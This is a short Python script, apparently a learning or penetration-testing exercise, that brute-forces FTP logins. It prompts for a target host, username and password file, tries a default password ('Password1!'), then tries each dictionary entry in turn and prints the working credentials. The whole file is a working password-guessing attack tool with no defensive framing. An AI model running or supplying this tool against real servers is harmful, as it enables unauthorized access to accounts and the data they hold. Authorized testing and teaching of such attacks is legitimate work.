import ftplib

def connect(host, user, password):

    # connect to FTP server using ftplib
    try:
        ftp = ftplib.FTP(host)
        ftp.login(user, password)
        ftp.quit()
        return True
    except:
        return False

def main():

    # define default variables
    print('')
    targetHostAddress = input('Enter FTP server address: ')
    userName = input('Enter FTP UserName: ')
    passwordsFilePath = input('Enter path to Passwords.txt file: ')

    # try to connect using anon credentials
    print('[+] Using default password for ' + targetHostAddress)
    if connect(targetHostAddress, userName, 'Password1!'):
        print('[+] FTP default login suceeded on host ' + targetHostAddress)
    else:
        print('[+] FTP default login failed on host ' + targetHostAddress)

        # try brute force using dictionary file 

        # open dictionary file passwords.txt
        passwordsfile = open(passwordsFilePath, 'r')

        for line in passwordsfile.readlines():
            # clean lines in dictionary file 
            password = line.strip('\r').strip('\n')
            print("[+] Testing: " + str(password))

            if connect(targetHostAddress, userName, password):
                # password found 
                print(
                    "[+] FTP Login succeeded on host " + targetHostAddress + " UserName: " + userName + " Password: " + password)
                # since pass is found exit the progarm 
                exit(0)

            else:
                # password NOT found
                print(
                    "[+] FTP Login failed o host " + targetHostAddress + " UserName: " + userName + " Password: " + password)

        else:
            pass


if __name__ == "__main__":
    main()
